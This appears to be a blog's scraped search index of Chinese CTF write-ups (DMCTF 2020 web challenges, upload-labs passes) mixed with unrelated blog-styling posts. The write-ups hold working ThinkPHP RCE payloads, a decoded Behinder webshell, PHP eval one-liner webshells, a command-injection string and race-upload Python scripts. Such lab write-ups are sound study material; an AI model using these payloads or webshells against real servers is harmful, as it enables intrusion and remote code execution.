这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对$_POST[‘_method’]属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。 测试payload： url： ?s=captcha post： _method=__construct\u0026filter=system\u0026method=get\u0026server[REQUEST_METHOD]=whoami 虽然报错但是最上方输出了www-data 根据题目中的提示flag在环境变量中，所以在网上查询linux系统输出环境变量的语句： text SHELL env\r最终获取到flag的payload： url： ?s=captcha post： _method=__construct\u0026filter=system\u0026method=get\u0026server[REQUEST_METHOD]=env 在输出末尾即是flag。 ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:2:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#thinkphp"},{"categories":["CTF"],"content":"\rfungame打开是个游戏当然要玩一玩了在线地址：https://justdui.github.io/。 我先下了源码到本地康一康，查看源码在game.js中第122行中： text JAVASCRIPT nextLevel = (nextLevel+1)%11;\rnextlevel根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码： text JAVASCRIPT class PlayerData { // track player data between levels (when player is destroyed) constructor() { this.health = 3; this.healthMax = 3; this.boomerangs = 1; this.bigBoomerangs = 0; this.coins = 0; } }\r人物属性值中的health、healthMax、bigBoomerangs数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0 ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:3:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#fungame"},{"categories":["CTF"],"content":"\rbingxie首先根据提示：你需要一些特殊软件，再看题目联想到Behinder，首先下载工具。 分析题目： 源码： text PHP \u003c?php error_reporting(0); highlight_file(__FILE__); function filter($file) //hint in bingxie.php { $file = strtolower($file); $file = str_replace('php', \"\", $file); $file = str_replace('data', \"???\", $file); $file = str_replace('http', \"???\", $file); $file = str_replace('file', \"???\", $file); $file = str_replace('input', \"???\", $file); $file = str_replace('filter', \"\", $file); $file = str_replace('log',\"???\",$file); return $file; } $file = $_GET['file']; $md5 =substr(md5($_GET['md5']),0,6); $file = filter($file); if ($md5=='e95100') { include $file; } ?\u003e\r代码16、17行使用GET方法获得file和md5参数，file经过filter函数过滤一些PHP协议，md5参数进行md5加密并截取前6位，判断是否为e95100，如果判定成功include包含file变量指定的文件。 首先计算什么数进行md5加密后前六位是e95100。参考了Getting MD5 with certain character pattern中的回答，使用脚本： text PYTHON import hashlib target = 'e95100' candidate = 0 while True: plaintext = str(candidate) hash = hashlib.md5(plaintext.encode('ascii')).hexdigest() if hash[:6] == target: print('plaintext:\"' + plaintext + '\", md5:' + hash) break candidate = candidate + 1\r运行之后很快得出md5加密后前六位是e95100的数字是6666。 再根据提示hint in bingxie.php，直接访问/bingxie.php只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为str_replace函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload： text CODE http://网址?md5=6666\u0026file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp\r得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的github项目地址）： text CODE PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg==\r解码后得到一个php文件： text PHP \u003c?php @error_reporting(0); session_start(); //如果接收到pass参数，则会生成16位的随机秘钥，存储到session中 $a = $_GET['a']; $b = $_GET['b']; if($a!=$b\u0026\u0026md5($a)==md5($b)) { echo \"you are right\"; } else{ die(\"no ,you are not a real hacker !!!\"); } if (isset($_GET['secret'])) { $key=substr(md5(uniqid(rand())),16); $_SESSION['k']=$key; print $key; } else { $key=$_SESSION['k']; $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i\u003cstrlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1\u002615]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __construct($p) {eval($p.\"\");}} @new C($params); } ?\u003e\r后半部分根据Behinder的官方文档和博客渗透测试-流量加密之冰蝎\u0026蚁剑的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行$_GET['secret']中的secret。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题weak_type中提到的不同字符串加密后md5相同绕过。最后payload： text CODE http://网址/bingxie.php?a=QNKCDZO\u0026b=240610708\r使用Behinder连接。可以在根目录下找到flag。 ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:4:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#bingxie"},{"categories":["CTF"],"content":"\rfilerce先看提示：看看log里面存的什么（利用伪协议包含），以下是访问后页面： text PHP \u003c?php error_reporting(0); show_source(__FILE__); $sandbox = '/var/www/html/sandbox/'.md5(\"DMCTF\".$_SERVER['REMOTE_ADDR']); mkdir($sandbox,0777,true); chdir($sandbox); if (isset($_GET['file'])) { if (strpos($_GET[\"file\"], \"base64-decode\")) { include $_GET[\"file\"]; } else { echo \"Hacker!!!\"; } } else{ echo \"get me a file\"; } file_put_contents(\"thx.log\", base64_encode('http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']))); echo \"\u003cbr/\u003e\"; echo \"You've been recorded in $sandbox/thx.log!!!!\" ?\u003e get me a file You've been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!!\r使用文件包含查看thx.log有什么，请求访问： text CODE http://网址?file=php://filter/convert.base64-decode/resource=thx.log\r输出了thx.log文件内容：http://dmctf.vaala.cloud:28236/favicon.ico，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了http://网址?file=php://filter/convert.base64-decode/resource=thx.log。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马： text CODE http://网址?file=php://filter/\u003c?php @eval($_POST['a']);?\u003econvert.base64-decode/resource=thx.log\r使用python脚本不断写入： text PYTHON #coding=utf-8 import requests import sys def CompeteUpload(): #上传页面 geturl=\"http://dmctf.vaala.cloud:28426/?file=php://filter/\u003c?php @eval($_POST['a']);?\u003econvert.base64-decode/resource=thx.log\" #访问上传文件 r1=requests.get(url=geturl) if __name__==\"__main__\": i=10; while (i\u003e0): i-=1; CompeteUpload();\r尝试访问http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接： text CODE http://网址?file=php://filter/convert.base64-decode/resource=thx.log\r同样在根目录下找到flag。 ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:5:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#filerce"},{"categories":["CTF"],"content":"\rdo_you_have_a_right_tokenF12查看网页代码，发现注释中一大段php代码估计就是题目用到的： text PHP \u003c?php session_start(); include 'flag.php'; date_default_timezone_set('Asia/Shanghai'); if(isset($_POST['token']) \u0026\u0026 isset($_SESSION['token']) \u0026\u0026!empty($_POST['token'])\u0026\u0026!empty($_SESSION['token'])){ if($_POST['token']==$_SESSION['token']){ echo \"PassResetSuccess! Your Flag is:\".$flag; }else{ echo \"Token_error!\"; } }else{ mt_srand(time()); $rand= mt_rand(); $_SESSION['token']=sha1(md5($rand)); echo \"Token Generate Ok!\"; } echo '\u003cform action=\"\" method=\"POST\"\u003e \u003cinput type=\"text\" name=\"token\"\u003e \u003cinput type=\"submit\" value=\"submit\"\u003e \u003c/form\u003e'; echo \"\u003c!--\\r\\n\".file_get_contents(__FILE__); ?\u003e\r分析一波：判断post请求中的token，如果不为空则与$_SESSION['token']判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入$_SESSION[‘token’]。 所以思路就是：我们需要知道生成的那个随机数的值，在网上搜到参考php伪随机数，可以根据种子预测随机数。题目使用： text CODE mt_srand(time());\r根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正： text PHP \u003c?php date_default_timezone_set('Asia/Shanghai'); echo time(); ?\u003e\r计算时间差为69，所以修改代码跑一遍： text PHP \u003c?php date_default_timezone_set('Asia/Shanghai'); // echo time()-69; 这是我验证时间用的 mt_srand(time()-69); $rand = mt_rand(); echo sha1(md5($rand)); ?\u003e\r提交本地运行后得到的密文提交上去就可以获得flag。 ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:6:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#do_you_have_a_right_token"},{"categories":["CTF"],"content":"\rpingpingping进入以后是一个类似终端的界面，随便输几个指令提示：输入help获得提示，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的pingpingping，可以使用通道符|连接执行其他命令，搜索到了疑似本题的博客GXYCTF–PingPingPing，猜测flag很有可能还在根目录下，所以可以执行cat /flag输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload： text CODE 127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh\r获得flag ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:7:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#pingpingping"},{"categories":["CTF"],"content":"\rp3’webshell提示给了一个链接：一些不包含数字和字母的webshell，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。） 源码： text CODE \u003c?php $command=$_POST['command']; highlight_file(__FILE__); if(!preg_match('/\\'|{|\\(|\\)|}|\\$|_|=|1|\\+|;|\\./i', $command)){ die(\"\u003cscript\u003ealert('?')\u003c/script\u003e\"); } eval($command); ?\u003e\r第4行使用正则表达式匹配$command字符串，但是前面有一个!取反，所以只要payload匹配到正则表达式即可绕过。post中请求： text CODE command=fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST['a']);?\u003e');\r使用蚁剑连接http://网址/shell.php，在根目录里找到flag。 ","date":"2020-11-29","objectID":"/posts/ctf/dmctf%E4%B9%8Bweb/:8:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/ctf/dmctf%E4%B9%8Bweb/#p3webshell"},{"categories":["瞎折腾"],"content":"\r前言​ 上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。 ","date":"2020-11-20","objectID":"/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/:1:0","series":null,"tags":["jsdelivr"],"title":"jsdelivr 缓存刷新","uri":"/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/#前言"},{"categories":["瞎折腾"],"content":"\r缓存刷新把原来访问的链接 https://cdn.jsdelivr.net/... 改为 https://purge.jsdelivr.net/... 访问资源就会进行刷新，然后页面会返回刷新信息： 划水收工。 ","date":"2020-11-20","objectID":"/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/:2:0","series":null,"tags":["jsdelivr"],"title":"jsdelivr 缓存刷新","uri":"/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/#缓存刷新"},{"categories":["瞎折腾"],"content":"\r前言​ 老早就觉得萌娘百科里的黑幕很好玩，所以摸索着给自己博客加了一个。参考博客Re：萌娘百科上的黑幕实现。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线~~ ~~标签修改了。我回来又想到了更好的方法，markdown支持文章中的自定义标签，自己增加一个\u003cspan class='heimu'\u003e...\u003c/span\u003e标签更好。那么两种都记一下吧。当然用自定义标签的话还可以保留删除线。 ","date":"2020-11-20","objectID":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:1:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#前言"},{"categories":["瞎折腾"],"content":"\r示例我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气 我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气 我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气 我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气 我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气 原博客图 萌娘百科官方介绍 ","date":"2020-11-20","objectID":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:2:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#示例"},{"categories":["瞎折腾"],"content":"\r准备工作​ 先进入主题的资源文件夹themes\\butterfly\\source\\，修改需要用到的文件css\\_global\\index.styl、js/main.js。 ​ 说明一下两个文件的作用：主题的总样式表index.css是经过整合形成的，而**.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。main.js里面使用选择器为标签添加title='你知道的太多了'，这个可以修改成自己喜欢的。 ","date":"2020-11-20","objectID":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:3:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#准备工作"},{"categories":["瞎折腾"],"content":"\r修改自定义标签 在index.styl文件末尾添加 stylus .heimu, .heimu a, a .heimu, .heimu a.new, .heimu code background-color: #252525 !important color: #252525 !important text-shadow: none .heimu:hover, .heimu:active, .heimu:hover .heimu, .heimu:active .heimu,.heimu code:hover color: white !important; .heimu:hover a, a:hover .heimu, .heimu:active a, a:active .heimu color: lightblue !important; .heimu:hover .new, .heimu .new:hover, .new:hover .heimu, .heimu:active .new, .heimu .new:active, .new:active .heimu color: #BA0000 !important;\r因为是.styl的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。 在main.js的unRefreshFn和refreshFn方法之前定义addheimuTitle函数 js //你知道的太多了 const addheimuTitle = function(){ console.log(123) $('.heimu').attr('title','你知道的太多了') }\r可以ctrl+f搜索上面那两个..refreshFn函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的addheimuTitle函数在这里面调用。我盲猜的嗷refreshFn这个函数是在载入页面会调用，直接在里面第二行加上 ","date":"2020-11-20","objectID":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:4:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#修改自定义标签"},{"categories":["瞎折腾"],"content":"\r修改删除线​ 修改css\\_layout\\post.styl文件，在文件中找到id为#article-container的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加 stylus #article-container ..... ..... del background-color: #252525; color: #252525; text-shadow: none; text-decoration: none \u0026:hover color: white !important;\r​ 因为文章中的删除线被渲染以后页面的标签为\u003cdel\u003e，选中id为article-container下的所有del标签添加样式，剩下的还有在main.js中添加title和上面的方法差不多，只需要把选择器修改为$('#article-container del').attr('title','你知道的太多了')。 ","date":"2020-11-20","objectID":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:5:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#修改删除线"},{"categories":["瞎折腾"],"content":"\r完工​ 两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。 ","date":"2020-11-20","objectID":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:6:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#完工"},{"categories":["CTF"],"content":"\rPass-17​ （windows环境，php版本5.2.17，题号是18题） 源码： php $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); } }else{ $msg = '上传出错！'; } }\r​ 思路和前面的一样，获取文件信息，移动文件到upload文件夹，第12行使用了白名单验证，多了第14行的rename函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了上传竞争，使用python脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码\u003c?php fputs(fopen('shell.php','w'),'\u003c?php phpinfo();?\u003e');?\u003e这段代码执行以后，会创建一个名为shell.php里面有一句\u003c?php phpinfo();?\u003e的文件。 ​ 脚本代码 python #coding=utf-8 import requests from multiprocessing import Pool def CompeteUpload(list): url=\"http://upload-labs/Pass-18/index.php\" #上传页面 geturl=\"http://upload-labs/upload/233.php\" #访问上传文件 file={'upload_file':('233.php',\"\u003c?php fputs(fopen('shell.php','w'),'\u003c?php phpinfo();?\u003e');?\u003e\",'image/jpeg')} data={'submit':'上传'} r=requests.post(url=url,data=data,files=file) #print \"test upload....\" r1=requests.get(url=geturl) if r1.status_code==200: print (\"upload success!\") if __name__==\"__main__\": pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join()\r​ 第一次用python的我在这里知道了pip。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工 ","date":"2020-11-19","objectID":"/posts/ctf/upload-labs5/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/ctf/upload-labs5/#pass-17"},{"categories":["CTF"],"content":"\rPass-18（失手）​ 18题失手了没有思路，如果使用include.php文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是apache2.2.x的解析漏洞，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。 Apache文件解析漏洞 apache httpd多后缀解析漏洞复现 ​ 源码中还有一个可以突破的点是同样使用了重命名函数，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以先摸为敬。 ","date":"2020-11-19","objectID":"/posts/ctf/upload-labs5/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/ctf/upload-labs5/#pass-18失手"},{"categories":["CTF"],"content":"\rPass-19（windows环境，php5.2.17，magic_quotes_gpc=Off） 源码： php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 源码第七行使用了POST来接受文件的命名，前面有类似题的是使用了0x00截断上传，后面也同样是move_uploaded_file移动文件的函数，还使用了黑名单验证，方法就很明确，使用截断上传。别忘了截断上传需要的特定条件：php版本需要低于5.3.29、magic_quotes_gpc需要为关闭状态。 ​ 同样是命名为phpa方便在十六进制表里修改为00 ​ 打开图片把url链接http://upload-labs/upload/upload-19.php�修改一下即可。完工 ​ 其实这道题还有一个思路，因为题目使用了黑名单验证，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如Php，不演示了。 ","date":"2020-11-19","objectID":"/posts/ctf/upload-labs5/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/ctf/upload-labs5/#pass-19"},{"categories":["CTF"],"content":"\rPass-20（LInux环境，php7.2.21） 源码： php $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \"禁止上传该类型文件!\"; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"禁止上传该后缀文件!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"文件上传成功！\"; $is_upload = true; } else { $msg = \"文件上传失败！\"; } } } }else{ $msg = \"请选择要上传的文件！\"; }\r​ 这道题使用了MIME验证和白名单验证。先看第10行使用了三目运算符判断$_POST['save_name']是否为空，若为空则执行:前获取上传文件的名称，若不为空则获取POST中的save_name。第11行使用了is_array函数判断是否是一个数组，然后使用explode截断文件名转换小写并返回数组。也就是说，如果我们POST中的save_name是个数组的就可以跳过11行的判断。15行使用end函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组第一个元素+数组元素总数-1的那个元素。 所以我们可以构造一个这样的数组用于绕过： ​ 数组[2]用于绕过白名单，文件名为：数组[0].数组[1]，但是数组[1]是空的所以只剩下数组[0].（后面有个点） ​ 别忘了还要绕过MIME 完工 ","date":"2020-11-19","objectID":"/posts/ctf/upload-labs5/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/ctf/upload-labs5/#pass-20"},{"categories":["CTF"],"content":"\r最后​ Upload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。 ","date":"2020-11-19","objectID":"/posts/ctf/upload-labs5/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/ctf/upload-labs5/#最后"},{"categories":["CTF"],"content":"\r前言​ 我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。 ​ 参考博客：upload-labs之pass 16详细分析 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#前言"},{"categories":["CTF"],"content":"\rPass-16​ 源码（三种图片的判定，只贴一个吧，篇幅小一点）： php $is_upload = false; $msg = null; if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") \u0026\u0026 ($filetype==\"image/jpeg\")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"png\") \u0026\u0026 ($filetype==\"image/png\")){ ...... }else if(($fileext == \"gif\") \u0026\u0026 ($filetype==\"image/gif\")){ ..... }else{ $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; } }\r​ 提示：本pass重新渲染了图片！。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。 ​ 首先是分析一波源码： ​ 以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行move_uploaded_file函数先把文件移动到upload文件夹，现在文件路径是$target_path，之后对图片进行二次渲染。 ​ 